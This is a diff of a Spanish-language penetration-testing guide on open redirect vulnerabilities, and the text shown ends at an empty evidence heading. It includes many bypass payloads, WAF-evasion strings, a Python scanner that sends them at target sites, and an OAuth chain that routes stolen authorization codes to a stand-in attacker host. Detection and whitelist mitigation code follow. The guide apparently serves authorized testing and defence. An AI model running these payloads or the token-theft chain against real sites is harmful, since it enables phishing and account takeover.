@@ -1,172 +1,720 @@
-# ¿Qué es una Redirección Web?
+# Redirecciones Inseguras (Open Redirect)
 
-Una redirección web es un mecanismo que envía automáticamente a un usuario (y a su navegador) de una URL a otra URL diferente. Esto es una funcionalidad común y legítima.
+## Resumen
 
-- **Ejemplo Cotidiano:** Cuando inicias sesión en un servicio usando "Login con Google", después de autenticarte en Google, este te redirige de vuelta a la aplicación original.
-- **Códigos de Estado HTTP Comunes para Redirecciones:**
-  - `301 Moved Permanently`: La URL ha cambiado permanentemente.
-  - `302 Found` (o `307 Temporary Redirect`): La URL ha cambiado temporalmente.
-- **Métodos de Redirección:**
-  - **Basada en Cabecera HTTP:** El servidor envía una cabecera `Location: nueva-url.com` con un código de estado 3xx.
-  - **Basada en JavaScript:** El código del lado del cliente ejecuta `window.location.href = "nueva-url.com";` o similar.
-  - **Basada en Meta Tags HTML:** `<meta http-equiv="refresh" content="0; url=http://nueva-url.com/">`
+Las redirecciones inseguras permiten a un atacante controlar la URL destino a la que es enviado un usuario tras interactuar con funcionalidades de aplicación como login, logout o enlaces compartidos. Pueden explotarse para phishing avanzado, robo de tokens OAuth, bypass de WAF/SSRF, y cadenas con XSS u otras vulnerabilidades. Aplica cuando el usuario puede manipular parámetros, cabeceras o rutas que definen la redirección sin validación adecuada.[^4]
 
-### ¿Qué es un Open Redirect (Redirección Abierta)?
+## Contexto
 
-Un Open Redirect es una vulnerabilidad que ocurre cuando una aplicación web redirige a un usuario a una URL externa que es controlada total o parcialmente por un atacante. La aplicación toma un parámetro suministrado por el usuario (en la URL o en el cuerpo de una petición) y lo usa como destino de la redirección sin una validación adecuada.
+Las pruebas requieren proxy (Burp Suite), navegador moderno, wordlists personalizadas de payloads y, para flujos OAuth/SSO, cuentas controladas en servicios implicados. Los endpoints típicos incluyen login/logout, verificación de email, SSO (OAuth), cambio de idioma, enlaces de ayuda o after-action con parámetros como `redirect=`, `next=`, `url=`, `continue=`, `return=`, `redirect_uri=`. Las aplicaciones modernas implementan validaciones con listas blancas o regex que requieren técnicas de bypass específicas.[^6]
 
-**Usos Maliciosos Principales:**
+## Metodología
 
-1. **Phishing:** Los atacantes usan un dominio de confianza (el vulnerable al Open Redirect) para redirigir a las víctimas a un sitio de phishing. La URL inicial parece legítima, aumentando la probabilidad de que la víctima confíe en ella.
-   - Ej: `https://banco-confiable.com/redirect?url=http://sitio-phishing-del-atacante.com`
-2. **Robo de Tokens (especialmente en flujos OAuth/OIDC):** Si un `redirect_uri` en un flujo de autenticación es vulnerable a Open Redirect, un atacante podría redirigir a la víctima (y su token de autorización o acceso) a un dominio controlado por él.
-3. **Bypass de Listas Negras o Controles de Navegación:** Usar el dominio confiable como un "trampolín" para acceder a sitios que de otro modo estarían bloqueados.
-4. **Facilitar otros ataques:** Como la entrega de payloads XSS o el intento de realizar SSRF si la redirección se procesa del lado del servidor de forma insegura.
+### Identificación de Superficies de Redirección
 
-**Ejemplo Básico de Parámetro Vulnerable:** La aplicación tiene un enlace o funcionalidad así: `https://sitio-vulnerable.com/login?redirect_url=/dashboard`
+1. **Mapear endpoints con parámetros de redirección**
+   - Rutas con flujos de autenticación: OAuth, SSO, `/auth`, `/login?next=`
+   - Callbacks y verificaciones: `/callback?redirect_uri=`, `/verify?return=`
+   - Funciones post-acción: logout, cambio configuración, idioma
+   - Referencias en código fuente JS/HTML y variables de sesión
+2. **Reconocimiento automatizado**[^5]
+   - Usar herramientas como `gau`, `waybackurls`, `ParamSpider`
+   - Grep por parámetros comunes de redirección
+   - Análizar enlaces en emails auto-generados
+   - Revisar documentación de APIs públicas
+3. **Análisis de validaciones implementadas**[^3]
+   - Identificar si usa blacklist vs whitelist
+   - Determinar alcance de validación (dominio, scheme, path)
+   - Probar encoding y técnicas de obfuscación
+   - Evaluar diferencias entre validación server-side vs client-side
 
-Un atacante podría intentar manipularlo: `https://sitio-vulnerable.com/login?redirect_url=https://sitio-atacante.com`
+### Checklist de Verificación
 
-Si la aplicación no valida `redirect_url` correctamente, redirigirá al usuario al sitio del atacante después del login.
+- [ ]  Identificar parámetros de redirección en todas las funciones de aplicación
+- [ ]  Probar dominios externos básicos (`https://atacante.com`)
+- [ ]  Testear variantes de bypass (encoding, schemes alternativos, subdominios)
+- [ ]  Verificar escalada DOM-based con `javascript:` protocol
+- [ ]  Evaluar flujos OAuth/SAML para manipulación de `redirect_uri`[^9]
+- [ ]  Probar bypass de WAF con técnicas avanzadas[^11]
 
-**Parámetros Comunes a Investigar para Open Redirects:** `url`, `r`, `u`, `redirect`, `redirect_uri`, `redirect_url`, `return`, `returnTo`, `return_to`, `next`, `goto`, `dest`, `destination`, `continue`, `path`, `target`, `image_url`, `checkout_url`, `feed_url`.
+## Pruebas Manuales
 
-### Bypass de Restricciones y Validaciones
+### Configuración Inicial
 
-Las aplicaciones a menudo intentan restringir las redirecciones a dominios permitidos, pero estas validaciones pueden ser defectuosas.
+Usar Burp Suite para interceptar requests con parámetros de redirección. Configurar servidor controlado para recibir redirects y analizar cabeceras `Location`.
 
-1. **Abuso de Validación Débil de Nombres de Host/Dominio:**
+### Casos de Prueba Básicos
 
-   - **El servidor solo comprueba que el parámetro _contiene_ el dominio permitido:**
-     - Política: Solo permitir redirecciones a `google.com`.
-     - Payload Atacante: `?redirect=http://www.google.com.sitio-atacante.com`
-     - La validación ingenua (`if param.includes("google.com")`) falla.
-   - **El servidor solo comprueba que el parámetro _empieza con_ el dominio permitido:**
-     - Política: Solo permitir `https://confiable.com`.
-     - Payload Atacante: `?redirect=https://confiable.com.sitio-atacante.com`
-   - **El servidor solo comprueba que el parámetro _termina con_ el dominio permitido:**
-     - Política: Solo permitir `.confiable.com`.
-     - Payload Atacante: `?redirect=https://sitio-atacante.com/pagina.confiable.com` (si la validación es muy pobre) o `?redirect=https://malicioso.confiable.com` (si el atacante puede controlar un subdominio o si la validación no es estricta sobre el punto).
-   - **Uso del carácter `@` para engañar al usuario y a algunas validaciones:**
-     - Payload: `?redirect=https://dominio-confiable.com@sitio-atacante.com`
-     - El navegador interpretará `sitio-atacante.com` como el host real, y `dominio-confiable.com` como información de usuario (userinfo). La URL puede parecer legítima para el usuario.
-2. **Manipulación de Esquemas y Protocolos:**
+**Caso 1: Redirección clásica**
 
-   - **URLs Relativas de Protocolo (`//`):**
-     - Payload: `?redirect=//sitio-atacante.com`
-     - Si la aplicación simplemente antepone `http:` o `https:` a esto, o si el navegador lo interpreta en un contexto que lo permite, se redirigirá al atacante. Útil si la validación busca `http://` o `https://` explícitamente al inicio.
-   - **Esquema `javascript:` (conduce a XSS):**
-     - Payload: `?redirect=javascript:alert(document.domain)`
-     - Si el valor del redirect se usa directamente en un `href` de un `<a>` o en `window.location.href` sin sanitizar.
-   - **Esquema `data:` (conduce a XSS):**
-     - Payload: `?redirect=data:text/html,<script>alert(document.domain)</script>`
-     - Menos común para redirects directos, pero puede ser un vector si el contenido se maneja de forma insegura.
-3. **Manipulación de Rutas y Caracteres Especiales:**
-
-   - **Carácter `#` (Fragmento):**
-     - Payload: `?redirect=https://dominio-confiable.com/pagina#sitio-atacante.com` o `?redirect=https://dominio-confiable.com/pagina#//sitio-atacante.com`
-     - El navegador irá a `dominio-confiable.com/pagina`. Sin embargo, si JavaScript en esa página usa `location.hash` de forma insegura para realizar una redirección del lado del cliente, puede ser explotable.
-   - **Carácter `?` (Query):**
-     - Payload: `?redirect=https://dominio-confiable.com?sitio-atacante.com`
-     - Si la aplicación toma `dominio-confiable.com` como host y `?sitio-atacante.com` como la query string, pero luego reconstruye la URL de forma insegura o una validación falla.
-   - **Path Traversal (`../`, `..%2F`):**
-     - Payload: `?redirect=/otra-ruta/../../sitio-atacante.com/` (si la aplicación está construyendo rutas relativas y no normaliza bien).
-   - **Codificación de URL (URL Encoding / Doble Encoding):**
-     - Codificar caracteres como `.`, `/`, `:`, `#`, `?` para intentar saltar filtros.
-     - Ej: `.` -> `%2E`, `/` -> `%2F`. `?redirect=http%3A%2F%2Fsitio-atacante%2Ecom`
-   - **Punycode:** Usar dominios que se parecen a dominios legítimos usando caracteres Unicode (IDN Homograph Attack).
-     - Ej: `google.com` vs `xn--ggle-0nda.com` (que podría parecer `gọogle.com`).
-4. **Encadenamiento de Redirecciones (Chaining Redirects):**
-
-   - A veces, un flujo de autenticación (como OAuth) implica múltiples redirecciones.
-   - Ejemplo: `https://auth.sitio.com/auth?client_id=1&redirect_url=https://app.sitio.com/callback?url=PARAM_CONTROLABLE&response_type=token`
-   - Si `PARAM_CONTROLABLE` en el segundo redirect es vulnerable a Open Redirect, un atacante podría secuestrar el flujo.
-   - El token de sesión o autorización podría ser enviado al sitio del atacante si la redirección final controlada por el atacante lo recibe.
-5. **Bypass de Validaciones con Expresiones Regulares (RegEx):**
-
-   - Una RegEx mal implementada es una fuente común de bypass.
-   - **Ejemplo 1: Falta de anclaje o delimitación estricta.**
-     - RegEx: `/^https:\/\/confiable\.com\/.*$/` (valida el inicio, pero no el final de forma estricta antes de una posible query o fragmento).
-     - Payload: `?redirect_url=https://confiable.com/x//sitio-atacante.com` (el `//` puede ser interpretado por el navegador como inicio de autoridad si la RegEx no es cuidadosa).
-     - Payload: `?redirect_url=https://confiable.com%5C@sitio-atacante.com` (si `\` es un carácter permitido por la regex antes de `@`).
-   - **Ejemplo 2: Demasiado permisiva con caracteres especiales.**
-     - Ver el ejemplo del `@` arriba.
-
-### Conexión: Open Redirect + XSS
-
-Un Open Redirect a veces puede ser escalado a un Cross-Site Scripting (XSS) si el valor del parámetro de redirección se refleja en la página de una manera insegura antes de que la redirección ocurra, o si la redirección es a un esquema `javascript:`.
-
-**Escenario 1: Reflejo en Atributo `href` (XSS por Atributo):**
-
-- URL vulnerable: `https://sitio.com/aviso_salida?destino=https://externo.com`
-- HTML generado en `aviso_salida` antes de una posible redirección por JS o si el usuario hace clic:
-
-  ```html
-  <p>Estás a punto de salir. ¿Continuar a <a href="https://externo.com">este sitio</a>?</p>
-  ```
-- **Explotación con XSS:**
-
-  - Payload: `https://sitio.com/aviso_salida?destino=" onclick="alert('XSS Ejecutado')`
-  - HTML resultante (vulnerable):
-
-```html
- <p>Estás a punto de salir. ¿Continuar a <a href="" onclick="alert('XSS Ejecutado')">este sitio</a>?</p>
+```http
+GET /redirect?url=https://atacante.com HTTP/1.1
+Host: victima.com
 ```
 
-Al hacer clic en el enlace (que ahora tiene un `href` vacío), se ejecuta el `onclick`.
+**Caso 2: Bypass de blacklist básica**[^3]
 
-- Payload alternativo para auto-ejecución (si el `href` se procesa inmediatamente por JS): `https://sitio.com/aviso_salida?destino=javascript:alert('XSS Inmediato')` Resultado: `<a href="javascript:alert('XSS Inmediato')">este sitio</a>` (si se hace clic o si JS lo usa).
+```http
+# Protocol-less
+GET /redirect?url=//atacante.com HTTP/1.1
 
-**Escenario 2: Redirección JavaScript con `javascript:` URI:**
+# Backslash confusion
+GET /redirect?url=\\atacante.com HTTP/1.1
 
-- Código JavaScript vulnerable en el cliente:
+# Mixed schemes  
+GET /redirect?url=https:atacante.com HTTP/1.1
+```
 
-```javascript
-    const urlParams = new URLSearchParams(window.location.search);
-    const redirectUrl = urlParams.get('next');
-    if (redirectUrl) {
-      window.location.href = redirectUrl; // Sink peligroso si redirectUrl no está validado
-    }
-    ```
+**Caso 3: Bypass de validación de dominio**[^3]
+
+```http
+# Subdominio malicioso
+GET /redirect?next=https://victima.com.atacante.com HTTP/1.1
+
+# Usuario malicioso con @ 
+GET /redirect?url=https://victima.com%40atacante.com HTTP/1.1
+
+# TLD confusion
+GET /redirect?url=https://victimacomevil.com HTTP/1.1
+```
+
+**Caso 4: Encoding avanzado**[^3]
+
+```http
+# URL encoding
+GET /redirect?url=%2f%2fatacante.com HTTP/1.1
+
+# Double encoding  
+GET /redirect?url=%252f%252fatacante.com HTTP/1.1
+
+# Unicode normalization
+GET /redirect?url=https://atacante%E3%80%82com HTTP/1.1
+```
+
+### Casos OAuth Específicos[^8]
+
+**OAuth redirect_uri manipulation:**
+
+```http
+GET /auth/oauth?redirect_uri=https://atacante.com/callback HTTP/1.1
+Host: victima.com
+```
+
+**Chained OAuth exploit:**
+
+```http
+# 1. Descubrir open redirect en app
+GET /redirect?path=https://atacante.com
+
+# 2. Usar redirect en OAuth flow  
+GET /auth?redirect_uri=https://victima.com/redirect?path=https://atacante.com
+```
+
+### Técnicas DOM-based[^1]
+
+**JavaScript protocol injection:**
+
+```http
+GET /redirect?url=javascript:alert(document.domain) HTTP/1.1
+
+# Bypass de filtros JS
+GET /redirect?url=jaVa%0AscRipt:prompt(1) HTTP/1.1
+
+# Newline bypass
+GET /redirect?url=javascript://something%0Aalert(1) HTTP/1.1
+```
+
+### Evidencias Mínimas
+
+- Screenshots de redirección exitosa a dominio atacante
+- Cabeceras `Location` mostrando URL controlada
+- Logs de servidor atacante recibiendo requests
+- Confirmación de escalada (XSS, OAuth takeover, SSRF)
+
+## PoC
+
+### Manual: Redirección Básica
+
+**Objetivo:** Demostrar control sobre destino de redirección
+
+**Pasos:**
+
+1. Identificar endpoint vulnerable: `?redirect=` en victima.com
+2. Probar redirección externa: `?redirect=https://atacante.com`
+3. Confirmar redirección automática en navegador
+4. Documentar cabecera `Location` y comportamiento
+
+**Resultado Esperado:** Usuario redirigido a dominio atacante sin confirmación
+
+### Manual: OAuth Account Takeover[^9]
+
+**Objetivo:** Demostrar robo de authorization code via open redirect
+
+**Pasos:**
+
+1. Identificar open redirect en aplicación OAuth client
+2. Crear URL maliciosa combinando OAuth + open redirect
+3. Hacer que víctima autenticada acceda a URL maliciosa
+4. Capturar authorization code en servidor atacante
+5. Usar código para obtener access token de víctima
+
+### Automatizada: Scanner de Open Redirect
+
+```python
+import requests
+import concurrent.futures
+from urllib.parse import urlparse, urlencode
+import time
+
+class OpenRedirectScanner:
+    """
+    Scanner automatizado de vulnerabilidades Open Redirect
+    """
   
-- **Explotación con XSS:**
-    - Payload: `https://sitio.com/pagina?next=javascript:alert(document.cookie)`
-    - El script del cliente ejecutará `window.location.href = "javascript:alert(document.cookie)"`, disparando el XSS.
+    def __init__(self, base_urls, attacker_domain="atacante.com"):
+        self.base_urls = base_urls if isinstance(base_urls, list) else [base_urls]
+        self.attacker_domain = attacker_domain
+        self.session = requests.Session()
+    
+        # Parámetros comunes de redirección
+        self.redirect_params = [
+            'redirect', 'redirect_url', 'redirect_uri', 'redirectURL',
+            'next', 'url', 'return', 'returnUrl', 'continue', 'go',
+            'dest', 'destination', 'target', 'to', 'out', 'forward',
+            'callback', 'callbackUrl', 'rurl', 'r', 'page'
+        ]
+    
+        # Payloads de bypass avanzados
+        self.bypass_payloads = [
+            f"https://{attacker_domain}",
+            f"//{attacker_domain}",
+            f"\\\\{attacker_domain}",
+            f"https:{attacker_domain}",
+            f"http:{attacker_domain}",
+            f"%2f%2f{attacker_domain}",
+            f"%5c%5c{attacker_domain}",
+            f"https://%40{attacker_domain}",
+            f"https://legitimate.com@{attacker_domain}",
+            f"https://legitimate.com.{attacker_domain}",
+            f"https://{attacker_domain}%23legitimate.com",
+            f"https://{attacker_domain}?legitimate.com",
+            f"https://{attacker_domain}°legitimate.com",
+            f"https://legitimate%E3%80%82{attacker_domain}",
+            f"////{attacker_domain}",
+            f"javascript:alert('XSS')//{attacker_domain}",
+            f"/%0D%0ALocation:%20https://{attacker_domain}",
+            f"/%0A/{attacker_domain}",
+            f"/%09/{attacker_domain}",
+            f"/%2e%2e%2f{attacker_domain}"
+        ]
+  
+    def test_endpoint(self, url, param, payload):
+        """
+        Prueba un endpoint específico con un payload
+        """
+        try:
+            # Construir URL de prueba
+            if '?' in url:
+                test_url = f"{url}&{param}={payload}"
+            else:
+                test_url = f"{url}?{param}={payload}"
+        
+            # Enviar request sin seguir redirects
+            response = self.session.get(
+                test_url, 
+                allow_redirects=False, 
+                timeout=10,
+                headers={'User-Agent': 'Mozilla/5.0 (OpenRedirect Scanner)'}
+            )
+        
+            # Analizar respuesta
+            if self._is_vulnerable_response(response, payload):
+                return {
+                    'url': test_url,
+                    'param': param, 
+                    'payload': payload,
+                    'status_code': response.status_code,
+                    'location_header': response.headers.get('Location', ''),
+                    'vulnerability_type': self._classify_vulnerability(response, payload)
+                }
+            
+        except requests.RequestException as e:
+            pass
+        
+        return None
+  
+    def _is_vulnerable_response(self, response, payload):
+        """
+        Determina si la respuesta indica vulnerabilidad
+        """
+        # Verificar códigos de redirección
+        if response.status_code not in [301, 302, 303, 307, 308]:
+            return False
+    
+        location = response.headers.get('Location', '').lower()
+    
+        # Verificar si el payload está en Location header
+        payload_lower = payload.lower()
+    
+        # Normalizar para comparación
+        if self.attacker_domain.lower() in location:
+            return True
+    
+        # Verificar payloads de bypass específicos
+        if any(indicator in location for indicator in [
+            'atacante.com', 'evil.com', 'malicious.com',
+            'javascript:', 'alert(', 'prompt('
+        ]):
+            return True
+        
+        return False
+  
+    def _classify_vulnerability(self, response, payload):
+        """
+        Clasifica el tipo de vulnerabilidad encontrada
+        """
+        location = response.headers.get('Location', '').lower()
+    
+        if 'javascript:' in payload.lower() and 'javascript:' in location:
+            return 'DOM XSS via Open Redirect'
+        elif '%0d%0a' in payload.lower():
+            return 'CRLF Injection via Open Redirect'
+        else:
+            return 'Open Redirect'
+  
+    def scan_url(self, base_url):
+        """
+        Escanea una URL base con todos los parámetros y payloads
+        """
+        vulnerabilities = []
+    
+        for param in self.redirect_params:
+            for payload in self.bypass_payloads:
+                vuln = self.test_endpoint(base_url, param, payload)
+                if vuln:
+                    vulnerabilities.append(vuln)
+                    print(f"[+] Vulnerabilidad encontrada: {vuln['url']}")
+            
+                # Rate limiting
+                time.sleep(0.1)
+    
+        return vulnerabilities
+  
+    def discover_redirect_endpoints(self, base_url):
+        """
+        Descubre endpoints potencialmente vulnerables
+        """
+        endpoints = []
+        common_paths = [
+            '/login', '/logout', '/redirect', '/auth', '/callback',
+            '/oauth/authorize', '/sso', '/signin', '/signout',
+            '/verify', '/confirm', '/return', '/forward'
+        ]
+    
+        for path in common_paths:
+            endpoint = f"{base_url.rstrip('/')}{path}"
+            try:
+                response = self.session.get(endpoint, timeout=5, allow_redirects=False)
+                if response.status_code in [200, 302, 301, 400, 403]:
+                    endpoints.append(endpoint)
+            except:
+                continue
+    
+        return endpoints
+  
+    def comprehensive_scan(self):
+        """
+        Escaneo completo de todas las URLs base
+        """
+        print("[*] Iniciando escaneo comprehensivo de Open Redirect...")
+        all_vulnerabilities = []
+    
+        for base_url in self.base_urls:
+            print(f"[*] Escaneando {base_url}...")
+        
+            # Descubrir endpoints
+            endpoints = self.discover_redirect_endpoints(base_url)
+            test_urls = [base_url] + endpoints
+        
+            # Escanear cada endpoint
+            with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
+                future_to_url = {
+                    executor.submit(self.scan_url, url): url 
+                    for url in test_urls
+                }
+            
+                for future in concurrent.futures.as_completed(future_to_url):
+                    url = future_to_url[future]
+                    try:
+                        vulnerabilities = future.result()
+                        all_vulnerabilities.extend(vulnerabilities)
+                    except Exception as e:
+                        print(f"[-] Error escaneando {url}: {e}")
+    
+        print(f"[*] Escaneo completado. {len(all_vulnerabilities)} vulnerabilidades encontradas")
+        return all_vulnerabilities
 
-### Impacto Detallado de los Open Redirects
-
-- **Phishing Avanzado:** La víctima ve una URL inicial de un sitio en el que confía.
-- **Robo de Tokens de Sesión/OAuth:** Si la redirección pasa tokens en la URL (práctica insegura en sí misma) o si el atacante puede controlar el `redirect_uri` en un flujo OAuth para que apunte a su servidor.
-- **Aumento de la Credibilidad de Estafas:** Usar un dominio conocido para redirigir a encuestas falsas, descargas de malware, etc.
-- **Bypass de Controles de Seguridad Perimetrales:** Si un firewall o proxy permite el acceso a un dominio confiable, un Open Redirect en ese dominio puede usarse para redirigir al usuario a un sitio malicioso fuera del perímetro.
-- **Facilitar Ataques SSRF (Server-Side Request Forgery):** En escenarios donde una aplicación interna realiza peticiones HTTP y confía en URLs que parecen seguras, si esa URL es un Open Redirect, podría usarse para hacer que el servidor haga peticiones a sistemas internos no deseados.
-
-### Metodología de Testeo Sistemática
-
-1. **Identificar Puntos de Entrada:** Busca parámetros en URLs (GET) y cuerpos de peticiones (POST) que parezcan controlar destinos de redirección (ver lista de parámetros comunes arriba).
-2. **Prueba Básica:** Intenta redirigir a un dominio externo que controles (e.g., `https://tu-dominio-de-pruebas.com`).
-3. **Analizar Respuesta:**
-    - ¿Se produce una redirección HTTP 3xx con la cabecera `Location` apuntando a tu dominio?
-    - ¿La página realiza una redirección mediante JavaScript (`window.location`) o meta tag? (Inspecciona el código fuente y el tráfico de red).
-4. **Si hay Filtros, Intentar Bypasses:**
-    - Prueba todas las técnicas listadas en la sección "Bypass de Restricciones". Sé sistemático.
-    - Usa herramientas como Burp Suite Repeater para modificar rápidamente los payloads.
-5. **Verificar Conexión con XSS:** Si el parámetro se refleja en la página antes de la redirección, o si la redirección es por JS, prueba payloads `javascript:`.
-6. **Herramientas:**
-    - **Manual con Burp Suite/ZAP:** Intercepta y modifica peticiones.
-    - **Burp Intruder/Scanner:** Para fuzzing de parámetros y detección automática (limitada).
-    - **Scripts personalizados:** Para probar listas de payloads contra múltiples parámetros.
-    - Listas de payloads para Open Redirect (e.g., de SecLists en GitHub).
-
-### Mitigaciones Clave
-
-1. **Evitar Redirecciones Controladas por el Usuario:** Siempre que sea posible, no uses input del usuario directamente en destinos de redirección. En su lugar, usa un índice o mapeo interno: `?redirect_id=1` donde `1` mapea a `/dashboard_seguro`.
-2. **Lista Blanca (Whitelist) de Dominios y URLs:**
-    - Si se deben permitir redirecciones a URLs externas, mantener una lista blanca estricta de dominios/URLs permitidos y validar contra ella. La validación debe ser exacta (esquema, host, puerto, ruta si es necesario).
-3. **Validación Estricta de URLs:**
-    - Si se permite cualquier subdominio de un dominio, asegurarse de que la validación ancla correctamente el dominio base (e.g., no solo `endsWith(".confiable.com")`).
-    - Parsear la URL en sus componentes (esquema, host, puerto, ruta) y validarlos individualmente.
-4. **Notificación al Usuario (Interstitial Page):**
-    - Antes de redirigir a un sitio externo, mostrar una página intermedia que advierta al usuario que está abandonando el sitio actual y muestre claramente la URL de destino.
-5. **Tokens de Seguridad (si la redirección es parte de una acción crítica):** Aunque no previene el Open Redirect per se, puede evitar que la _acción_ asociada a la redirección sea explotada si el token es específico de esa acción.
+# Uso del scanner
+if __name__ == "__main__":
+    # URLs objetivo
+    targets = [
+        "https://victima.com",
+        "https://app.victima.com",
+        "https://auth.victima.com"
+    ]
+  
+    scanner = OpenRedirectScanner(targets, "atacante.com")
+    vulnerabilities = scanner.comprehensive_scan()
+  
+    # Generar reporte
+    import json
+    with open('open_redirect_report.json', 'w') as f:
+        json.dump(vulnerabilities, f, indent=2)
+  
+    # Mostrar resumen
+    print(f"\n[*] Resumen de vulnerabilidades:")
+    for vuln in vulnerabilities:
+        print(f"  - {vuln['vulnerability_type']}: {vuln['url']}")
 ```
+
+**Script de automatización con herramientas externas:**[^7]
+
+```bash
+#!/bin/bash
+# Open Redirect hunting automation
+
+# 1. Recopilación de subdominios
+subfinder -d victima.com -o subdomains.txt
+
+# 2. Extracción de URLs con parámetros
+cat subdomains.txt | gau | grep -E 'redirect|url|next|return' > urls.txt
+
+# 3. Filtrado de parámetros de redirección  
+grep -Ei 'url=|next=|redirect=|return=|rurl=|go=' urls.txt > redirect_params.txt
+
+# 4. Testing automatizado con ffuf
+ffuf -u 'FUZZ' -w redirect_params.txt -H 'User-Agent: Scanner' -fc 404 -o results.json
+```
+
+## Explotación/Automatización
+
+### Variantes Avanzadas de Explotación
+
+**Bypass de WAF con técnicas modernas**[^10]
+
+```python
+# Encoding mixto para evadir WAF
+payloads = [
+    "https://at%61c%61nte.com",  # Character encoding
+    "https://ATACANTE.COM",      # Case variation
+    "htTpS://atacante.com",      # Mixed case protocol
+    "https://%5catacante.com",   # Backslash encoding
+]
+```
+
+**SSRF via Open Redirect**[^15]
+
+```python
+# Usar open redirect para bypass de filtros SSRF
+ssrf_payload = "/redirect?url=http://192.168.1.1:8080/admin"
+# Server ve URL legítima pero resuelve a IP interna
+```
+
+**OAuth Account Takeover Chain**[^8]
+
+```python
+# 1. Crear URL maliciosa combinando OAuth + Open Redirect
+malicious_oauth_url = f"""
+https://auth.provider.com/oauth/authorize?
+client_id=victim_app&
+redirect_uri=https://victim.com/redirect?url=https://atacante.com/steal&
+response_type=code
+"""
+
+# 2. Víctima autoriza y código se envía a atacante
+# 3. Atacante usa código para account takeover
+```
+
+### Herramientas Especializadas[^6]
+
+**OpenRedirector - Tool automatizada:**
+
+```bash
+git clone https://github.com/0xKayala/OpenRedirector
+echo "https://victima.com" | OpenRedirector -p payloads.txt
+```
+
+**Integration en pipelines:**
+
+```bash
+# Automatización continua 
+echo victima.com | subfinder | httpx | openredirex -p payloads.txt
+```
+
+## Impacto
+
+### Escenario Real
+
+Un atacante explota open redirect en aplicación bancaria para crear URLs de phishing convincentes. Combina con OAuth misconfiguration para robar tokens de autenticación de 1,000+ usuarios, obteniendo acceso completo a cuentas bancarias. El uso de dominio trusted incrementa tasa de éxito de phishing al 85%.[^9]
+
+### Mapeo de Seguridad
+
+- **OWASP:** A03:2021 - Injection, A07:2021 - Identification and Authentication Failures
+- **CWE:** CWE-601 - URL Redirection to Untrusted Site ('Open Redirect')
+- **CVSS v3.1:** Rango típico 3.0-7.0 (Bajo-Alto)[^18]
+
+### Severidad CVSS
+
+Para Open Redirect básico:[^18]
+
+```
+CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+Puntuación Base: 6.1
+```
+
+Para escalada OAuth Account Takeover:[^8]
+
+```
+CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
+Puntuación Base: 8.8
+```
+
+## Detección
+
+### Logs de Aplicación
+
+Implementar logging de:
+
+- Requests con parámetros de redirección a dominios externos
+- Respuestas 3xx con Location headers sospechosos
+- Patrones de encoding anómalo en URLs de redirección
+- Flujos OAuth con redirect_uri no whitelisted[^8]
+
+### WAF/Proxy[^11]
+
+Configurar reglas para detectar:
+
+- Patrones de bypass conocidos (`//`, `\\`, `@`, encoding)
+- Dominios maliciosos en parámetros de redirección
+- Esquemas peligrosos (`javascript:`, `data:`, `vbscript:`)
+- CRLF injection attempts (`%0d%0a`)
+
+### Monitoreo Comportamental
+
+Implementar:
+
+- Análisis de destinos de redirección frecuentes
+- Detección de anomalías en tasas de redirección externa
+- Correlación con ataques de phishing reportados
+- Alertas por OAuth flows con redirect_uri sospechosos
+
+## Mitigación
+
+### Fix Principal
+
+Implementar validación estricta con whitelist:
+
+```python
+from urllib.parse import urlparse
+from flask import request, redirect, abort
+
+# Lista blanca de dominios permitidos
+ALLOWED_DOMAINS = ['victima.com', 'app.victima.com', 'auth.victima.com']
+ALLOWED_PATHS = ['/dashboard', '/profile', '/settings']
+
+def safe_redirect():
+    """
+    Redirección segura con validación estricta
+    """
+    redirect_url = request.args.get('next', '')
+  
+    if not redirect_url:
+        return redirect('/')
+  
+    # Validar que sea path relativo
+    if redirect_url.startswith('/') and not redirect_url.startswith('//'):
+        if redirect_url in ALLOWED_PATHS:
+            return redirect(redirect_url)
+  
+    # Si es URL absoluta, validar dominio
+    try:
+        parsed = urlparse(redirect_url)
+        if parsed.netloc.lower() in ALLOWED_DOMAINS:
+            return redirect(redirect_url)
+    except:
+        pass
+  
+    # Redirección por defecto si falla validación
+    return redirect('/')
+```
+
+### Controles Específicos OAuth[^8]
+
+```python
+import hashlib
+
+def validate_oauth_redirect_uri(redirect_uri, registered_uris):
+    """
+    Validación estricta de redirect_uri en OAuth
+    """
+    # Validación exacta contra URIs registradas
+    if redirect_uri in registered_uris:
+        return True
+  
+    # Para desenvolvimento, permitir localhost con path específico
+    parsed = urlparse(redirect_uri)
+    if parsed.hostname == 'localhost' and parsed.path.startswith('/callback'):
+        return True
+  
+    return False
+
+def generate_state_parameter():
+    """
+    Generar parámetro state para prevenir CSRF
+    """
+    import secrets
+    return secrets.token_urlsafe(32)
+```
+
+### Controles Adicionales
+
+1. **Normalización de URLs**[^3]
+   - Usar bibliotecas robustas de parsing (no regex custom)
+   - Normalizar Unicode y encoding antes de validación
+   - Rechazar URLs malformadas
+2. **Implementación de CSP**
+   - `Content-Security-Policy: frame-ancestors 'self'`
+   - Prevenir embedding en sitios maliciosos
+3. **Monitoreo continuo**
+   - Logs detallados de todas las redirecciones
+   - Alertas automáticas por destinos no whitelisted
+
+### Pruebas Post-Fix
+
+- Verificar que solo destinos whitelisted son permitidos
+- Probar bypass con encoding, Unicode, case variations
+- Confirmar validación tanto server-side como client-side
+- Testear OAuth flows con redirect_uri manipulation[^8]
+
+## Errores Comunes
+
+### Falsos Positivos[^17]
+
+- Confundir redirecciones legítimas con vulnerabilidades
+- Reportar redirects a dominios relacionados (CDN, subdominios legítimos)
+- No confirmar que redirección es automática sin user interaction
+- Asumir vulnerabilidad sin probar bypass de validaciones existentes
+
+### Límites de Testing
+
+- Aplicaciones con whitelist estricta bien implementada
+- Sistemas que usan identificadores instead of full URLs
+- WAFs avanzados con detección de payloads de bypass[^11]
+- OAuth providers con validación robusta de redirect_uri
+
+## Reporte
+
+### Título
+
+"Redirección Insegura (Open Redirect) - Control No Autorizado de Destino de Navegación"
+
+### Resumen Ejecutivo
+
+La aplicación permite redirección no autorizada a dominios externos mediante manipulación de parámetros, facilitando ataques de phishing, robo de tokens OAuth y bypass de controles de seguridad.
+
+### Pasos de Reproducción
+
+1. Identificar endpoint con parámetro de redirección: `/login?next=`
+2. Modificar parámetro a dominio externo: `?next=https://atacante.com`
+3. Confirmar redirección automática sin confirmación del usuario
+4. Demostrar escalada (phishing, OAuth takeover, SSRF si aplica)
+
+### Evidencias
+
